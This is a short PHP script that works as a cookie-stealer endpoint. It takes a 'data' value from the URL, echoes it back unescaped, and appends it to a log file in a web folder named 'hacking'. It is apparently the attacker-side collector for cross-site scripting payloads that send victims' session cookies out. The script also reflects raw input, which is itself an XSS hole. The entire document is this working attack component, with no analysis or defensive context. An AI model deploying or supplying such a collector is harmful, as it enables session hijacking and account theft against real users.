<?php
$cookie=$_GET['data'];
echo($cookie);
$log=fopen("/var/www/html/hacking/data.txt", "a");
fwrite($log,$cookie);
fclose($log);
?>
